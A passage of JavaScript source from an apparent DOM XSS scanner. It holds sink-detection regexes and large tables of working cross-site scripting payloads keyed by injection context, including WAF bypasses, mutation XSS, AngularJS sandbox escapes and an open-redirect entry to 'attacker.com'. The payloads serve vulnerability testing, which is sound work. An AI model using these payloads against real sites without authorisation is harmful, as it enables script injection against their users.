    { func: null, call: "setTimeout('alert(1)')",                desc: 'setTimeout string eval' },
    { func: null, call: "Function('alert(1)')()",                desc: 'Function constructor direct' },
    { func: null, call: "eval(atob('YWxlcnQoMSk='))",          desc: 'base64 eval' },
  ];

  // =====================================================
  // COMPOSITE SINKS — patterns requiring multiple signals in the same file
  // =====================================================
  // Code-execution functions that can act as eval-like sinks
  const EXEC_FUNCS = [
    { name: 'eval',           re: /\beval\s*\(/i },
    { name: 'new Function',   re: /new\s+Function\s*\(/i },
    { name: 'setTimeout',     re: /\bsetTimeout\s*\(\s*[^,)]*(?:response|\.text\b)/i },
    { name: 'setInterval',    re: /\bsetInterval\s*\(\s*[^,)]*(?:response|\.text\b)/i },
    { name: '$.globalEval',   re: /\.globalEval\s*\(/i },
  ];
  // Response data sources that carry user-controlled content
  const RESP_SOURCES = [
    { name: 'responseText',   re: /\.responseText\b/i },
    { name: 'response',       re: /\.response\b/i },
    { name: '.text()',        re: /\.text\s*\(\s*\)/i },
    { name: '.json()',        re: /\.json\s*\(\s*\)/i },
  ];
  // XHR/fetch transport indicators
  const TRANSPORTS = [
    { name: 'XMLHttpRequest', re: /XMLHttpRequest/i },
    { name: 'fetch',          re: /\bfetch\s*\(/i },
  ];

  // Build composite sinks dynamically: exec_func + response_source = critical
  //                                    exec_func + transport = high
  ns.COMPOSITE_SINKS = [];
  for (const exec of EXEC_FUNCS) {
    for (const resp of RESP_SOURCES) {
      ns.COMPOSITE_SINKS.push({
        name: `${exec.name}(${resp.name})`,
        tests: [exec.re, resp.re],
        category: 'Reflected DOM XSS', severity: 'critical',
        desc: `${exec.name}() of ${resp.name} — user input flows through XHR/fetch → code execution`,
      });
    }
    for (const transport of TRANSPORTS) {
      ns.COMPOSITE_SINKS.push({
        name: `${exec.name} + ${transport.name}`,
        tests: [exec.re, transport.re],
        category: `DOM XSS via ${transport.name}`, severity: 'high',
        desc: `${exec.name}() and ${transport.name} in same file`,
      });
    }
  }

  // =====================================================
  // CONTEXT PAYLOADS — what to try per injection context
  // =====================================================
  ns.CONTEXT_PAYLOADS = {
    'html-body': {
      desc: 'Inside HTML body (between tags)',
      conditions: [
        { chars: ['<', '>', '/'], payload: '<img src=x onerror=alert(1)>', note: 'Direct tag injection' },
        { chars: ['<', '>'], payload: '<svg onload=alert(1)>', note: 'SVG onload' },
        { chars: ['<'], payload: '<details open ontoggle=alert(1)>', note: 'Only needs < (browser closes tag)' },
        { chars: ['<', '>'], payload: '<svg><animate onbegin=alert(1) attributeName=x dur=1s>', note: 'SVG animate onbegin (WAF bypass)' },
        { chars: ['<', '>'], payload: '<xss tabindex=1 onfocus=alert(1) id=x>#x', note: 'Custom element + onfocus + hash focus (WAF bypass)' },
        { chars: ['<', '>'], payload: '<body onresize=alert(1)>', note: 'body onresize' },
        { chars: ['<', '>'], payload: '<input autofocus onfocus=alert(1)>', note: 'autofocus onfocus' },
        { chars: ['<', '>'], payload: '<video><source onerror=alert(1)>', note: 'video source onerror' },
        { chars: ['<', '>'], payload: '<iframe src="javascript:alert(1)">', note: 'iframe javascript:' },
        { chars: ['<', '>'], payload: '<math><mtext><table><mglyph><svg><mtext><style><img src onerror=alert(1)>', note: 'Mutation XSS via math/svg namespace confusion' },
      ],
    },
    'html-attr-dq': {
      desc: 'Inside double-quoted HTML attribute',
      conditions: [
        { chars: ['"', '>'], payload: '"><img src=x onerror=alert(1)>', note: 'Close attr + inject tag' },
        { chars: ['"'], payload: '" onfocus="alert(1)" autofocus="', note: 'Inject event handler in same tag' },
        { chars: ['"', ' '], payload: '" onmouseover="alert(1)', note: 'Event handler (needs interaction)' },
        { chars: ['"'], payload: '" accesskey="x" onclick="alert(1)', note: 'Accesskey + onclick (ALT+SHIFT+X)' },
        { chars: ['"', '>'], payload: '"><svg onload=alert(1)>', note: 'Break attr + svg onload' },
        { chars: ['"', '>'], payload: '"><details open ontoggle=alert(1)>', note: 'Break attr + details ontoggle' },
      ],
    },
    'html-attr-sq': {
      desc: 'Inside single-quoted HTML attribute',
      conditions: [
        { chars: ["'", '>'], payload: "'><img src=x onerror=alert(1)>", note: 'Close attr + tag' },
        { chars: ["'"], payload: "' onfocus='alert(1)' autofocus='", note: 'Event handler in same tag' },
        { chars: ["'"], payload: "' accesskey='x' onclick='alert(1)", note: 'Accesskey + onclick' },
      ],
    },
    'html-attr-uq': {
      desc: 'Unquoted HTML attribute',
      conditions: [
        { chars: [' ', '>'], payload: ' onfocus=alert(1) autofocus ', note: 'Just needs space' },
        { chars: ['>'], payload: '><img src=x onerror=alert(1)>', note: 'Close tag + new tag' },
        { chars: [' '], payload: ' accesskey=x onclick=alert(1)', note: 'Accesskey attack' },
      ],
    },
    'html-attr-href': {
      desc: 'Inside href/src/action attribute',
      conditions: [
        { chars: [':'], payload: 'javascript:alert(1)', note: 'javascript: protocol' },
        { chars: ['"', '>'], payload: '"><img src=x onerror=alert(1)>', note: 'Close attr + tag' },
        { chars: ['/', ':'], payload: '//attacker.com', note: 'Open redirect' },
        { chars: [':'], payload: 'data:text/html,<script>alert(1)</script>', note: 'data: URI' },
        { chars: [':'], payload: 'javascript:alert`1`', note: 'javascript: with template literal' },
        { chars: [':'], payload: 'JaVaScRiPt:alert(1)', note: 'Mixed case javascript:' },
        { chars: [':'], payload: 'java\tscript:alert(1)', note: 'Tab in javascript: protocol' },
        { chars: [':'], payload: 'java&#9;script:alert(1)', note: 'HTML entity tab in javascript:' },
        { chars: [':'], payload: 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==', note: 'Base64 data URI (bypasses content filters)' },
      ],
    },
    'html-attr-event': {
      desc: 'Inside event handler attribute (onclick, onerror, etc.)',
      conditions: [
        { chars: ["'"], payload: "'-alert(1)-'", note: 'Break string with expression' },
        { chars: ["'", ';'], payload: "';alert(1)//", note: 'Close string + execute' },
        { chars: ['"'], payload: '&quot;-alert(1)-&quot;', note: 'HTML entity encoded quote break' },
        { chars: [], payload: '&apos;-alert(1)-&apos;', note: 'HTML entity apos break (event attrs decode entities)' },
        { chars: ['\\'], payload: "\\'-alert(1)//", note: 'Backslash to neutralize server escape' },
      ],
    },
    'js-string-dq': {
      desc: 'Inside double-quoted JS string',
      conditions: [
        { chars: ['"', ';'], payload: '";alert(1)//', note: 'Close string + execute' },
        { chars: ['"'], payload: '"-alert(1)-"', note: 'Break string with expression' },
        { chars: ['\\', '"'], payload: '\\";alert(1)//', note: 'Double backslash to neutralize escape + break string' },
        { chars: ['\\', '"', '-', '}'], payload: '\\"-alert(1)}//', note: 'Backslash escape + break JSON eval (quotes escaped by server)' },
        { chars: ['<'], payload: '</script><script>alert(1)</script>', note: 'Script tag breakout (quotes irrelevant at HTML level)' },
      ],
    },
    'js-string-sq': {
      desc: 'Inside single-quoted JS string',
      conditions: [
        { chars: ["'", ';'], payload: "';alert(1)//", note: 'Close string + execute' },
        { chars: ["'"], payload: "'-alert(1)-'", note: 'Break string with expression' },
        { chars: ['\\', "'"], payload: "\\';alert(1)//", note: 'Double backslash to neutralize escape' },
        { chars: ['\\', "'", '-', '}'], payload: "\\'-alert(1)}//", note: 'Backslash escape + break JSON eval (quotes escaped by server)' },
        { chars: ['<'], payload: '</script><script>alert(1)</script>', note: 'Script tag breakout (quotes irrelevant at HTML level)' },
      ],
    },
    'js-template': {
      desc: 'Inside JS template literal (`...`)',
      conditions: [
        { chars: ['`'], payload: '`; alert(1); `', note: 'Close template + execute' },
        { chars: ['{', '}', '$'], payload: '${alert(1)}', note: 'Template interpolation' },
        { chars: ['{', '}'], payload: '${alert(document.domain)}', note: 'Template interpolation with domain' },
      ],
    },
    'html-comment': {
      desc: 'Inside HTML comment',
      conditions: [
        { chars: ['-', '>'], payload: '--><img src=x onerror=alert(1)>', note: 'Close comment + tag' },
        { chars: ['-', '>'], payload: '--><svg onload=alert(1)>', note: 'Close comment + svg' },
      ],
    },
    'css-context': {
      desc: 'Inside CSS context (style tag/attr)',
      conditions: [
        { chars: ['<', '/'], payload: '</style><img src=x onerror=alert(1)>', note: 'Close style + tag (most reliable)' },
        { chars: ['<', '/'], payload: '</style><svg onload=alert(1)>', note: 'Close style + svg (if img filtered)' },
        { chars: ['"', ')'], payload: '");alert(1)//', note: 'Close url() + JS in some contexts' },
        { chars: ['\\', '(', ')'], payload: '\\);alert(1)//', note: 'Close value + inject JS (escape filter)' },
        { chars: ['}', '<', '/'], payload: '}</style><img src=x onerror=alert(1)>', note: 'Close rule + style + tag' },
      ],
    },
    'angular-expression': {
      desc: 'Inside AngularJS template expression',
      conditions: [
        { chars: ['{', '}'], payload: '{{$on.constructor("alert(1)")()}}', note: 'AngularJS sandbox escape' },
        { chars: ['{', '}'], payload: '{{constructor.constructor("alert(1)")()}}', note: 'Constructor chain' },
        { chars: ['{', '}'], payload: '{{[].pop.constructor("alert(1)")()}}', note: 'Array proto constructor' },
        { chars: ['.', '=', ';', '|'], payload: 'toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)', note: 'Sandbox escape without strings (fromCharCode + charAt override)' },
      ],
    },
    'canonical-link': {
      desc: 'Inside canonical/link tag attribute',
      conditions: [
        { chars: ["'"], payload: "' accesskey='x' onclick='alert(1)' ", note: 'Accesskey + onclick (ALT+SHIFT+X on Chrome)' },
        { chars: ['"'], payload: '" accesskey="x" onclick="alert(1)" ', note: 'Accesskey + onclick (double quotes)' },
      ],
    },
    'select-context': {
      desc: 'Inside <select> element (need to close </select> first)',
      conditions: [
        { chars: ['<', '/'], payload: '</select><img src=1 onerror=alert(1)>', note: 'Close select + img onerror' },
        { chars: ['<', '/'], payload: '</option></select><img src=1 onerror=alert(1)>', note: 'Close option + select + img onerror' },
        { chars: ['<', '/'], payload: '</select><svg onload=alert(1)>', note: 'Close select + svg onload' },
        { chars: ['"', '<', '/'], payload: '"></select><img src=1 onerror=alert(1)>', note: 'Break attr + close select + img' },
      ],
    },
    'textarea-context': {
      desc: 'Inside <textarea> element (need to close </textarea> first)',
      conditions: [
        { chars: ['<', '/'], payload: '</textarea><img src=1 onerror=alert(1)>', note: 'Close textarea + img onerror' },
        { chars: ['<', '/'], payload: '</textarea><svg onload=alert(1)>', note: 'Close textarea + svg onload' },
        { chars: ['"', '<', '/'], payload: '"></textarea><img src=1 onerror=alert(1)>', note: 'Break attr + close textarea + img' },
      ],
    },
    'title-context': {
      desc: 'Inside <title> element (need to close </title> first)',
      conditions: [
        { chars: ['<', '/'], payload: '</title><img src=1 onerror=alert(1)>', note: 'Close title + img onerror' },
        { chars: ['<', '/'], payload: '</title><svg onload=alert(1)>', note: 'Close title + svg onload' },
      ],
    },
    'iframe-srcdoc': {
      desc: 'Inside iframe srcdoc attribute (nested HTML context)',
      conditions: [
        { chars: ['"', '<', '>'], payload: '"><img src=x onerror=alert(1)>', note: 'Close srcdoc + inject tag' },
        { chars: ['<', '>'], payload: '<img src=x onerror=alert(1)>', note: 'Direct tag injection in srcdoc' },
        { chars: ['<', '>'], payload: '<svg onload=alert(1)>', note: 'SVG onload in srcdoc' },
        { chars: ['&', '<'], payload: '&lt;img src=x onerror=alert(1)&gt;', note: 'HTML entity injection (srcdoc HTML-decodes entities)' },
      ],
    },
    'noscript-context': {
      desc: 'Inside <noscript> tag (content shown when JS disabled, but can still break out)',
      conditions: [
        { chars: ['<', '/'], payload: '</noscript><img src=x onerror=alert(1)>', note: 'Close noscript + inject tag' },
        { chars: ['<', '/'], payload: '</noscript><svg onload=alert(1)>', note: 'Close noscript + svg' },
      ],
    },
    'meta-refresh': {
      desc: 'Inside meta http-equiv="refresh" content attribute',
      conditions: [
        { chars: [':'], payload: '0;url=javascript:alert(1)', note: 'Meta refresh with javascript: URL' },
        { chars: [':'], payload: '0;url=data:text/html,<script>alert(1)</script>', note: 'Meta refresh with data: URL' },
        { chars: ['"', '<'], payload: '"><img src=x onerror=alert(1)>', note: 'Close attr + inject tag' },
      ],
    },
    'js-code': {
      desc: 'Inside JavaScript code (not in a string)',
      conditions: [
        { chars: ['(', ')'], payload: 'alert(1)', note: 'Direct function call' },
        { chars: ['(', ')'], payload: '-alert(1)-', note: 'Expression context' },
        { chars: [], payload: 'alert`1`', note: 'Tagged template (no parens)' },
        { chars: [';'], payload: ';alert(1)//', note: 'Statement break + comment' },
        { chars: ['<', '/'], payload: '</script><img src=x onerror=alert(1)>', note: 'Escape script context' },
      ],
    },
    'js-url': {
      desc: 'Inside javascript: URL with restrictions',
      conditions: [
        { chars: ['(', ')'], payload: 'alert(1)', note: 'Direct function call' },
        { chars: [], payload: 'alert`1`', note: 'Tagged template literal (no parentheses)' },
        { chars: [], payload: 'throw/**/onerror=alert,1', note: 'throw + onerror (no parentheses needed)' },
        { chars: ['{', '}'], payload: '{alert(1)}', note: 'Block statement' },
        { chars: [], payload: 'window["alert"](1)', note: 'Bracket notation (bypass char filter)' },
        { chars: [], payload: '},x=x=>{throw/**/onerror=alert,1337},toString=x,window+\'\',{x:\'', note: 'Arrow fn + toString override (spaces blocked)' },
        { chars: [], payload: 'void(onerror=alert),throw/**/1', note: 'void + throw (no parens on throw target)' },
        { chars: [], payload: 'alert?.(1)', note: 'Optional chaining call (WAF bypass — ?. not filtered)' },
        { chars: [], payload: 'self?.["alert"]?.(1)', note: 'Optional chaining + bracket notation (bypass keyword filter)' },
        { chars: [], payload: 'true,alert?.(/XSS/)', note: 'Comma operator + optional chaining (WAF bypass)' },
        { chars: [], payload: 'self?.[/alert/.source]?.(1)', note: 'Regex source + optional chaining (construct name dynamically)' },
      ],
    },
  };

  ns.HL_STYLES = {
    sink:        { color: '#ff0000', width: '3px', glow: false, bg: '#ff0000' },
    input:       { color: '#ff0000', width: '4px', glow: true,  bg: '#cc0000', anim: '__domxss-pulse' },
    'fuzz-src':  { color: '#00ddff', width: '4px', glow: true,  bg: '#007799', anim: '__domxss-pulse-cyan' },
    'fuzz-refl': { color: '#ff00ff', width: '4px', glow: true,  bg: '#990099', anim: '__domxss-pulse-magenta' },
    'fuzz-xss':  { color: '#00ff00', width: '5px', glow: true,  bg: '#006600', anim: '__domxss-pulse-green' },
  };

  // =====================================================
  // VERIFY PAYLOADS — per context, with check functions
  // =====================================================
  ns.VERIFY_PAYLOADS = {
    'html-body': [
      { needs: ['<'],
        payload: id => `<img src=x onerror="window.__xss_${id}=1">`,
        check: id => !!window[`__xss_${id}`],
        desc: 'img onerror (standard)', bypass: null },
      { needs: ['<'],
        payload: id => `<svg/onload=window.__xss_${id}=1>`,
        check: id => !!window[`__xss_${id}`],
        desc: 'svg onload (no quotes)', bypass: null },
      { needs: ['<'],
        payload: id => `<details open ontoggle=window.__xss_${id}=1>x</details>`,
        check: id => !!window[`__xss_${id}`],
        desc: 'details ontoggle (only <)', bypass: null },
      { needs: ['<'],
        payload: id => `<body onload=window.__xss_${id}=1>`,
        check: id => !!window[`__xss_${id}`],
        desc: 'body onload fallback', bypass: null },
      { needs: ['<', '>'],
        payload: id => `<svg><a><animate attributeName=href values=javascript:void(window.__xss_${id}=1) /><text x=20 y=20>Click me</text></a>`,
        check: id => !!window[`__xss_${id}`],
        desc: 'SVG animate href (no event handlers, click required)', bypass: 'event handlers + href blocked',
        needsInteraction: true,
        realPayload: '<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>' },
      { needs: ['<', '>'],
        payload: id => `<svg><animate onbegin=window.__xss_${id}=1 attributeName=x dur=1s>`,
        check: id => !!window[`__xss_${id}`],
        desc: 'SVG animate onbegin (WAF bypass)', bypass: 'onerror/onload filtered' },
      { needs: ['<', '>'],
        payload: id => `<svg><animatetransform onbegin=window.__xss_${id}=1 attributeName=transform type=rotate dur=1s>`,
        check: id => !!window[`__xss_${id}`],
        desc: 'SVG animatetransform onbegin', bypass: 'animate filtered' },
      { needs: ['<', '>'],
        payload: id => `<svg><set onbegin=window.__xss_${id}=1 attributeName=x to=1 dur=1s>`,
        check: id => !!window[`__xss_${id}`],
        desc: 'SVG set onbegin', bypass: 'animate filtered' },
      { needs: ['<'],
        payload: id => `<input autofocus onfocus=window.__xss_${id}=1>`,
        check: id => !!window[`__xss_${id}`],
        desc: 'input autofocus onfocus', bypass: 'img/svg filtered' },
      { needs: ['<', '>'],
        payload: id => `<video><source onerror=window.__xss_${id}=1>`,
        check: id => !!window[`__xss_${id}`],
        desc: 'video source onerror', bypass: 'img filtered' },
      { needs: ['<'],
        payload: id => `<xss tabindex=1 onfocus=window.__xss_${id}=1 id=x${id}><style>*{display:block}</style>`,
        check: id => {
          if (window[`__xss_${id}`]) return true;
          const el = document.getElementById(`x${id}`);
          if (el) { el.focus(); return !!window[`__xss_${id}`]; }
          return false;
        },
        desc: 'Custom element + tabindex + onfocus (WAF bypass)', bypass: 'all standard tags blocked' },
      { needs: ['<', '>'],
        payload: id => `<math><mtext><table><mglyph><svg><mtext><textarea><path id=x><animate attributeName=href values=javascript:window.__xss_${id}=1 /><set attributeName=href values=javascript:window.__xss_${id}=1 />`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Mutation XSS via math/svg namespace', bypass: 'strict tag filter' },
      { needs: ['<'],
        payload: id => `<iframe onload=window.__xss_${id}=1>`,
        check: id => !!window[`__xss_${id}`],
        desc: 'iframe onload', bypass: 'img/svg filtered' },
      { needs: ['<'],
        payload: id => `<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart=window.__xss_${id}=1>`,
        check: id => !!window[`__xss_${id}`],
        desc: 'CSS animation + onanimationstart (WAF bypass)', bypass: 'event handlers blocked' },
    ],
    'html-attr-dq': [
      { needs: ['"', '>'],
        payload: id => `"><img src=x onerror="window.__xss_${id}=1">`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Close attr + img onerror',
        realPayload: '"><img src=x onerror=alert(1)>', bypass: null },
      { needs: ['"', ' '],
        payload: id => `" onfocus="window.__xss_${id}=1" autofocus="`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Event handler in same tag',
        realPayload: '" autofocus onfocus="alert(1)', bypass: null },
      { needs: ['"'],
        payload: id => `" onmouseover="window.__xss_${id}=1`,
        check: id => !!window[`__xss_${id}`],
        desc: 'onmouseover (needs interaction)',
        realPayload: '" onmouseover="alert(1)', bypass: null },
      { needs: ['"'],
        payload: id => `" accesskey="x" onclick="window.__xss_${id}=1`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Accesskey + onclick (ALT+SHIFT+X)',
        realPayload: '" accesskey="x" onclick="alert(1)', bypass: null },
      { needs: ['"', '>'],
        payload: id => `"><svg onload="window.__xss_${id}=1">`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Break attr + svg onload',
        realPayload: '"><svg onload=alert(1)>', bypass: 'img filtered' },
      { needs: ['"', '>'],
        payload: id => `"><details open ontoggle="window.__xss_${id}=1">`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Break attr + details ontoggle',
        realPayload: '"><details open ontoggle=alert(1)>', bypass: 'img/svg filtered' },
      { needs: ['"', '>'],
        payload: id => `"><input autofocus onfocus="window.__xss_${id}=1">`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Break attr + input autofocus',
        realPayload: '"><input autofocus onfocus=alert(1)>', bypass: 'img/svg filtered' },
    ],
    'html-attr-sq': [
      { needs: ["'", '>'],
        payload: id => `'><img src=x onerror='window.__xss_${id}=1'>`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Close attr sq + img onerror',
        realPayload: "'><img src=x onerror='alert(1)'>", bypass: null },
      { needs: ["'", ' '],
        payload: id => `' onfocus='window.__xss_${id}=1' autofocus='`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Event handler sq',
        realPayload: "' autofocus onfocus='alert(1)", bypass: null },
      { needs: ["'"],
        payload: id => `' accesskey='x' onclick='window.__xss_${id}=1`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Accesskey sq',
        realPayload: "' accesskey='x' onclick='alert(1)", bypass: null },
    ],
    'html-attr-uq': [
      { needs: [' '],
        payload: id => ` onfocus=window.__xss_${id}=1 autofocus `,
        check: id => !!window[`__xss_${id}`],
        desc: 'Event handler unquoted',
        realPayload: ' autofocus onfocus=alert(1) ', bypass: null },
      { needs: ['>'],
        payload: id => `><img src=x onerror=window.__xss_${id}=1>`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Close tag + new tag',
        realPayload: '><img src=x onerror=alert(1)>', bypass: null },
      { needs: [' '],
        payload: id => ` accesskey=x onclick=window.__xss_${id}=1 `,
        check: id => !!window[`__xss_${id}`],
        desc: 'Accesskey unquoted',
        realPayload: ' accesskey=x onclick=alert(1) ', bypass: null },
    ],
    'html-attr-href': [
      { needs: [':'],
        payload: id => `javascript:void(window.__xss_${id}=1)`,
        check: id => {
          if (window[`__xss_${id}`]) return true;
          const marker = `__xss_${id}`;
          const els = document.querySelectorAll('a, area, base, [href]');
          for (const el of els) {
            const rawHref = el.getAttribute('href') || '';
            const propHref = el.href || '';
            if ((rawHref.includes('javascript:') || propHref.includes('javascript:')) &&
                (rawHref.includes(marker) || propHref.includes(marker) ||
                 rawHref.includes(encodeURIComponent(marker)) || propHref.includes(encodeURIComponent(marker)))) {
              window[`__xss_${id}`] = 1;
              return true;
            }
          }
          return false;
        },
        desc: 'javascript: protocol in href',
        realPayload: 'javascript:alert(1)', bypass: null },
      { needs: ['"', ' '],
        payload: id => `" onclick="window.__xss_${id}=1" x="`,
        check: id => {
          if (window[`__xss_${id}`]) return true;
          const els = document.querySelectorAll(`[onclick*="__xss_${id}"]`);
          for (const el of els) { try { el.click(); } catch {} }
          return !!window[`__xss_${id}`];
        },
        desc: 'Event handler via attr close', bypass: null },
      { needs: ['"', '>'],
        payload: id => `"><img src=x onerror="window.__xss_${id}=1">`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Close href + new tag', bypass: null },
      { needs: [':'],
        payload: id => `data:text/html,<script>opener.__xss_${id}=1</script>`,
        check: id => {
          if (window[`__xss_${id}`]) return true;
          const els = document.querySelectorAll('[href]');
          for (const el of els) {
            const hrefVal = el.getAttribute('href') || '';
            if (hrefVal.startsWith('data:') && hrefVal.includes(`__xss_${id}`)) {
              window[`__xss_${id}`] = 1;
              return true;
            }
          }
          return false;
        },
        desc: 'data: URI in href', bypass: 'javascript: filtered' },
      { needs: [':'],
        payload: id => `javascript:void(window.__xss_${id}=1)`,
        check: id => {
          if (window[`__xss_${id}`]) return true;
          const marker = `__xss_${id}`;
          const els = document.querySelectorAll('[href]');
          for (const el of els) {
            const raw = el.getAttribute('href') || '';
            if (/^[\s]*j[\s]*a[\s]*v[\s]*a[\s]*s[\s]*c[\s]*r[\s]*i[\s]*p[\s]*t[\s]*:/i.test(raw) && raw.includes(marker)) {
              window[`__xss_${id}`] = 1;
              return true;
            }
          }
          return false;
        },
        desc: 'javascript: with whitespace bypass', bypass: 'strict protocol check' },
      { needs: [':'],
        payload: id => `data:text/html;base64,${btoa(`<script>opener.__xss_${id}=1</script>`)}`,
        check: id => {
          if (window[`__xss_${id}`]) return true;
          const els = document.querySelectorAll('[href]');
          for (const el of els) {
            const hrefVal = el.getAttribute('href') || '';
            if (hrefVal.startsWith('data:text/html;base64,')) {
              window[`__xss_${id}`] = 1;
              return true;
            }
          }
          return false;
        },
        desc: 'Base64 data URI in href', bypass: 'javascript: and data:text/html filtered' },
    ],
    'html-attr-event': [
      { needs: [],
        payload: id => `&apos;-window.__xss_${id}=1-&apos;`,
        check: id => !!window[`__xss_${id}`],
        desc: 'HTML entity &apos; break in event handler (browsers decode entities in attrs)',
        realPayload: "&apos;-alert(1)-&apos;", bypass: 'quotes escaped by server' },
      { needs: [],
        payload: id => `http://foo?&apos;-window.__xss_${id}=1-&apos;`,
        check: id => !!window[`__xss_${id}`],
        desc: 'URL-shaped &apos; break for URL-validated event handler fields',
        realPayload: "http://foo?&apos;-alert(1)-&apos;", bypass: 'quotes escaped + URL validation' },
      { needs: ["'"],
        payload: id => `';window.__xss_${id}=1//`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Close string + execute in event handler',
        realPayload: "';alert(1)//", bypass: null },
      { needs: ['\\', "'"],
        payload: id => `\\';window.__xss_${id}=1//`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Backslash neutralize escape + break string',
        realPayload: "\\';alert(1)//", bypass: 'single quotes escaped' },
    ],
    'js-string-dq': [
      { needs: ['"', ';'],
        payload: id => `";window.__xss_${id}=1//`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Close string dq + execute', bypass: null },
      { needs: ['"'],
        payload: id => `"-window.__xss_${id}=1-"`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Break string with expression', bypass: null },
      { needs: ['\\', '"'],
        payload: id => `\\";window.__xss_${id}=1//`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Double backslash bypass when quotes escaped', bypass: 'quotes escaped',
        realPayload: '\\";alert(1)//' },
      { needs: ['\\', '"', '-'],
        payload: id => `\\"-(window.__xss_${id}=1)}//`,
        check: (id, win) => !!(win || window)[`__xss_${id}`],
        desc: 'Backslash escape + break JSON eval', bypass: 'quotes escaped by server',
        realPayload: '\\"-alert(1)}//' },
      { needs: ['<'],
        payload: id => `</script><script>window.__xss_${id}=1</script>`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Script breakout via new script tag', bypass: null },
      { needs: ['<'],
        payload: id => `</script><svg onload=window.__xss_${id}=1>`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Script breakout via svg', bypass: 'script tag filtered' },
    ],
    'js-string-sq': [
      { needs: ["'", ';'],
        payload: id => `';window.__xss_${id}=1//`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Close string sq + execute', bypass: null },
      { needs: ["'"],
        payload: id => `'-window.__xss_${id}=1-'`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Break string with expression', bypass: null },
      { needs: ['\\', "'"],
        payload: id => `\\';window.__xss_${id}=1//`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Double backslash bypass when quotes escaped', bypass: 'quotes escaped',
        realPayload: "\\';alert(1)//" },
      { needs: ['\\', "'", '-'],
        payload: id => `\\'-(window.__xss_${id}=1)}//`,
        check: (id, win) => !!(win || window)[`__xss_${id}`],
        desc: 'Backslash escape + break JSON eval', bypass: 'quotes escaped by server',
        realPayload: "\\'-alert(1)}//" },
      { needs: ['<'],
        payload: id => `</script><script>window.__xss_${id}=1</script>`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Script breakout via new script tag', bypass: null },
      { needs: ['<'],
        payload: id => `</script><svg onload=window.__xss_${id}=1>`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Script breakout via svg', bypass: 'script tag filtered' },
    ],
    'js-template': [
      { needs: ['`'],
        payload: id => '`;window.__xss_' + id + '=1//`',
        check: id => !!window[`__xss_${id}`],
        desc: 'Close template + execute', bypass: null },
      { needs: ['{', '}', '$'],
        payload: id => '${window.__xss_' + id + '=1}',
        check: id => !!window[`__xss_${id}`],
        desc: 'Template interpolation', bypass: null },
      { needs: ['{', '}', '$'],
        payload: id => '${window["__xss_' + id + '"]=1}',
        check: id => !!window[`__xss_${id}`],
        desc: 'Template interpolation bracket', bypass: null },
    ],
    'html-comment': [
      { needs: ['-', '>'],
        payload: id => `--><img src=x onerror="window.__xss_${id}=1">`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Close comment + tag', bypass: null },
      { needs: ['-', '>'],
        payload: id => `--><svg onload=window.__xss_${id}=1>`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Close comment + svg', bypass: 'img filtered' },
    ],
    'css-context': [
      { needs: ['<', '/'],
        payload: id => `</style><img src=x onerror="window.__xss_${id}=1">`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Close style + img onerror', bypass: null },
      { needs: ['<', '/'],
        payload: id => `</style><svg onload=window.__xss_${id}=1>`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Close style + svg onload', bypass: 'img filtered' },
      { needs: ['}', '<', '/'],
        payload: id => `}</style><img src=x onerror="window.__xss_${id}=1">`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Close CSS rule + style + tag', bypass: 'unclosed rule' },
    ],
    'angular-expression': [
      { needs: ['{', '}', '(', ')', "'"],
        payload: id => `{{constructor.constructor('window.__xss_${id}=1')()}}`,
        check: id => !!window[`__xss_${id}`],
        desc: 'AngularJS constructor chain', bypass: null },
      { needs: ['{', '}', '(', ')', "'"],
        payload: id => `{{$on.constructor('window.__xss_${id}=1')()}}`,
        check: id => !!window[`__xss_${id}`],
        desc: 'AngularJS $on.constructor', bypass: null },
      { needs: ['{', '}', '(', ')', "'"],
        payload: id => `{{[].pop.constructor('window.__xss_${id}=1')()}}`,
        check: id => !!window[`__xss_${id}`],
        desc: 'AngularJS array proto constructor', bypass: null },
      { needs: ['{', '}', '(', ')', "'", '.', '='],
        payload: id => `{{'a'.constructor.prototype.charAt=[].join;$eval('x=window.__xss_${id}=1')}}`,
        check: id => !!window[`__xss_${id}`],
        desc: 'AngularJS charAt override sandbox escape (<=1.5)',
        realPayload: "{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}",
        bypass: 'string filtering' },
      { needs: ['(', ')', '.', '=', ';', '|'],
        payload: id => {
          const expr = `constructor.constructor('window.__xss_${id}=1')()`;
          const cc = [...expr].map(c => c.charCodeAt(0)).join(',');
          return `toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(${cc})`;
        },
        check: id => !!window[`__xss_${id}`],
        desc: 'AngularJS sandbox escape — fromCharCode (no strings)',
        realPayload: 'toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)',
        bypass: 'strings filtered', isCSTI: true },
